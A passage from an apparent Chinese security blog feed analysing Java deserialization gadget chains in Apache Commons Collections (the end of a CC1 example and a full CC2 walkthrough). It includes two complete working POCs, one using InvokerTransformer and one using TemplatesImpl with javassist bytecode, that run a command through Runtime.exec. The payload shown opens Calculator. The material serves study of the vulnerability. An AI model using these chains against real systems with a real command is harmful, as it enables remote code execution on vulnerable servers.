class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, chainedTransformer);</span><br><span class="line">        <span class="comment">// 获取AnnotationInvocationHandler类对象</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="comment">// 获取AnnotationInvocationHandler类的构造方法</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        <span class="comment">// 设置方法访问权限</span></span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">mapHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class, outerMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, mapHandler);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class, proxyMap);</span><br><span class="line">        <span class="comment">// 将真正的利用链数组设置到ChainedTransformer里面的iTransformers字段值</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(chainedTransformer, transformers);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输出流</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(handler);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 服务端</span></span><br><span class="line"><span class="comment">     *  */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CommonsCollections2利用链分析</title>
      <link href="/2022/11/10/CommonsCollections2/"/>
      <url>/2022/11/10/CommonsCollections2/</url>
      
        <content type="html"><![CDATA[<h1 id="CommonsCollections2利用链分析"><a href="#CommonsCollections2利用链分析" class="headerlink" title="CommonsCollections2利用链分析"></a>CommonsCollections2利用链分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><code>CommonsCollections2</code>利用链利用环境如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CommonsCollections 4.0</span><br><span class="line">JDK 版本暂无限制</span><br><span class="line">需要 javassist(伪条件，具体见下文)</span><br></pre></td></tr></table></figure><p>可以看到，在 cc2 是针对<code>CommonsCollections 4.0</code>新版本的利用链，环境配置 Maven 依赖如下（需要 javassist 的原因在下文）：<br><img src="/2022/11/10/CommonsCollections2/image-20221009105637369.png" alt="image-20221009105637369"></p><p>利用链如下：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">    PriorityQueue.readObject()</span><br><span class="line">        PriorityQueue.heapify()</span><br><span class="line">            PriorityQueue.siftDown()</span><br><span class="line">                PriorityQueue.siftDownUsingComparator()</span><br><span class="line">                    TransformingComparator.compare()</span><br><span class="line">                        ChainedTransformer.transform()</span><br><span class="line">                        ConstantTransformer.transform()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Class.getMethod()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Runtime.getRuntime()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Runtime.exec()</span><br></pre></td></tr></table></figure></p><p>我们就跟着链子逐步探究一番。</p><h2 id="PriorityQueue"><a href="#PriorityQueue" class="headerlink" title="PriorityQueue"></a>PriorityQueue</h2><p>看<code>PriorityQueue#readObject()</code>方法源码<br><img src="/2022/11/10/CommonsCollections2/image-20221009112426049.png" alt="image-20221009112426049"></p><p>可以看到对传入的对象输入流<code>s</code>进行反序列化并传入到<code>queue</code>数组中，说明<code>s</code>是经过序列化后的数据，那么接着看<code>writeObject()</code>序列化方法<br><img src="/2022/11/10/CommonsCollections2/image-20221009112818375.png" alt="image-20221009112818375"></p><p>其中对<code>queue</code>数组遍历进行序列化，而<code>queue</code>是<code>PriorityQueue</code>类的一个属性，那么我们可以通过反射进行控制，所以<code>queue</code>成为可控点。<br><img src="/2022/11/10/CommonsCollections2/image-20221009112947079.png" alt="image-20221009112947079"></p><p>前面可以看到<code>readObject()</code>方法最后还调用了<code>heapify()</code>方法，我们接着跟<code>heapify()</code><br><img src="/2022/11/10/CommonsCollections2/image-20221009113211379.png" alt="image-20221009113211379"></p><p><code>headify()</code>方法进行循环并调用了<code>siftDown()</code>方法，其中第二个参数<code>queue</code>是可控点，继续跟进<code>siftDown()</code>源码<br><img src="/2022/11/10/CommonsCollections2/image-20221009113328581.png" alt="image-20221009113328581"></p><p>这里做了一个判断，如果<code>comparator</code>不为空，则进入<code>siftDownUsingComparator(k, x)</code>方法。<br><img src="/2022/11/10/CommonsCollections2/image-20221009113434631.png" alt="image-20221009113434631"></p><p>这里<code>comparator</code>也是<code>PriorityQueue</code>类的一个属性，因此也可以通过反射进行控制。此外，因为前面的<code>queue</code>是可控的，所以这里<code>siftDownUsingComparator(k, x)</code>的<code>x</code>也是可控的。</p><p>继续跟进<code>siftDownUsingComparator()</code>方法源码<br><img src="/2022/11/10/CommonsCollections2/image-20221009113836865.png" alt="image-20221009113836865"></p><p>可以看到这里调用到了<code>comparator.compare()</code>方法，而<code>comparator</code>是可控的，并且<code>comparator(x,c)</code>中的<code>x</code>也是可控的。</p><p>根据利用链可以看到<code>comparator</code>被赋值为<code>TransformingComparator</code>，接下来到了<code>TransformingComparator.compare()</code>方法。</p><h2 id="TransformingComparator"><a href="#TransformingComparator" class="headerlink" title="TransformingComparator"></a>TransformingComparator</h2><p>跟进<code>TransformingComparator#compare()</code>方法<br><img src="/2022/11/10/CommonsCollections2/image-20221009120104239.png" alt="image-20221009120104239"></p><p>可以看到会执行<code>this.transformer.transform()</code>方法，并且<code>this.transformer</code>在前面构造参数方法的时候进行赋值，因此也是可控点。这里可以根据前面学习的<code>CommonsCollections1</code>开始构造 POC 了。</p><p>在构造 POC 前，发现<code>ysoserial</code>中的<code>queue</code>添加了两个元素<br><img src="/2022/11/10/CommonsCollections2/image-20221009121010160.png" alt="image-20221009121010160"></p><p>这是为啥捏？回去重新跟一下，发现原来是要满足在<code>heapify()</code>方法的操作，如果只有一个元素则<code>size</code>为 1，最后经过无符号右移动 1 位并且减 1 ，则结果为 -1 将无法进入<code>siftDown()</code>方法<br><img src="/2022/11/10/CommonsCollections2/image-20221009121552839.png" alt="image-20221009121552839"></p><p>补充一下，<code>TransformingComparator</code>类只有在<code>CommonsCollections4.0</code>的时候才实现<code>serializable</code>接口，因此才可以进行序列化与反序列化。<br><img src="/2022/11/10/CommonsCollections2/image-20221012154454936.png" alt="image-20221012154454936"></p><p>这也是为什么<code>CommonsCollections2</code>限制了利用版本在<code>CommonsCollections4.0</code>的原因。</p><h2 id="构造-POC"><a href="#构造-POC" class="headerlink" title="构造 POC"></a>构造 POC</h2><p>根据以上学习，利用链已经清晰明了，构造 POC<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/9 10:51</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">CommonsCollections2</span> <span class="variable">commonsCollections2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonsCollections2</span>();</span><br><span class="line">        commonsCollections2.serialize();</span><br><span class="line">        commonsCollections2.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;open -a Calculator.app&quot;</span>;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">// new Class[0]为占位符</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 创建ChainedTransformer调用链</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(chainedTransformer);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">comparator</span> <span class="operator">=</span> priorityQueue.getClass().getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        comparator.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        comparator.set(priorityQueue, transformingComparator);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(priorityQueue);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 服务端</span></span><br><span class="line"><span class="comment">     *  */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="ysoserial中的利用链"><a href="#ysoserial中的利用链" class="headerlink" title="ysoserial中的利用链"></a>ysoserial中的利用链</h2><p>在<code>ysoserial</code>中的利用链则和前面我们所构造的有所不同，gadget 如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">    PriorityQueue.readObject()</span><br><span class="line">        PriorityQueue.heapify()</span><br><span class="line">            PriorityQueue.siftDown()</span><br><span class="line">                PriorityQueue.siftDownUsingComparator()</span><br><span class="line">                    TransformingComparator.compare()</span><br><span class="line">                        InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    TemplatesImpl.newTransformer()</span><br><span class="line">                                         TemplatesImpl.getTransletInstance()</span><br><span class="line">                                         TemplatesImpl.defineTransletClasses</span><br><span class="line">                                         newInstance()</span><br><span class="line">                                            Runtime.exec()</span><br></pre></td></tr></table></figure><p>与我们前面构造的 POC 不同的是，<code>ysoserial</code>后面采用了<code>TemplatesImpl</code>类，我们跟进<code>TemplatesImpl#newTransformer()</code>方法<br><img src="/2022/11/10/CommonsCollections2/image-20221010113159001.png" alt="image-20221010113159001"></p><p>该方法中调用了<code>getTransletInstance()</code>，继续跟进<code>getTransletInstance()</code>源码<br><img src="/2022/11/10/CommonsCollections2/image-20221010113437251.png" alt="image-20221010113437251"></p><p>上面可以看到当<code>this._class</code>为<code>null</code>时就会调用<code>defineTransletClasses()</code>方法，因为<code>this._class</code>为<code>TemplatesImpl</code>类的属性，所以是可以通过反射控制的。</p><p>继续跟进<code>defineTransletClasses()</code>方法<br><img src="/2022/11/10/CommonsCollections2/image-20221010113526585.png" alt="image-20221010113526585"></p><p>这里通过<code>load.defineClass()</code>方法将字节码进行加载定义一个新的类，而<code>this._bytecodes</code>也是类的属性，所以也是可以通过反射进行控制字节码。此外，接下来的<code>superClass.getName().equals(ABSTRACT_TRANSLET)</code>判断新定义的类是否继承<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>类，只有继承才会将下标<code>i</code>赋值给<code>this._transletIndex</code>。</p><p>最后再通过<code>newInstance()</code>方法实例化新定义的类<br><img src="/2022/11/10/CommonsCollections2/image-20221010114142369.png" alt="image-20221010114142369"></p><p>构造 POC 为<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/9 10:51</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">CommonsCollections2</span> <span class="variable">commonsCollections2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonsCollections2</span>();</span><br><span class="line">        commonsCollections2.serialize();</span><br><span class="line">        commonsCollections2.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;Runtime.getRuntime().exec(\&quot;open -a Calculator.app\&quot;);&quot;</span>;</span><br><span class="line">        <span class="comment">// 创建evailClass</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">evailClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;evailClass&quot;</span>);</span><br><span class="line">        <span class="comment">// 将代码插进static&#123;&#125;</span></span><br><span class="line">        evailClass.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        evailClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">// 转换成字节码</span></span><br><span class="line">        <span class="type">byte</span>[] classBytes = evailClass.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classBytes&#125;;</span><br><span class="line">        <span class="comment">// 反射修改</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, targetByteCodes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;name&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">_class</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_class&quot;</span>);</span><br><span class="line">        _class.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _class.set(templates, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 构造InvokerTransformer</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;</span>).getDeclaredConstructor(String.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> (InvokerTransformer) constructor.newInstance(<span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(invokerTransformer);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 通过反射修改queue</span></span><br><span class="line">        Object[] objectsArrary = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates,<span class="number">1</span>&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">queue</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">        queue.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        queue.set(priorityQueue,objectsArrary);</span><br><span class="line">        <span class="comment">// 通过反射将comparator修改为前面的链子</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">comparator</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        comparator.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        comparator.set(priorityQueue, transformingComparator);</span><br><span class="line"></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(priorityQueue);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 服务端</span></span><br><span class="line"><span class="comment">     *  */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/2022/11/10/CommonsCollections2/image-20221010161316401.png" alt="image-20221010161316401"></p><p><strong>这里为什么需要再通过一次反射修改 queue ？</strong> </p><p>可以往回到<code>compara()</code>方法，因为我们这次使用的是<code>InvokerTransformer</code>，其中的<code>transform()</code>参数<code>obj1</code>需要设置为<code>TemplatesImpl</code>类，去触发<code>TemplatesImpl#newTransformer()</code><br><img 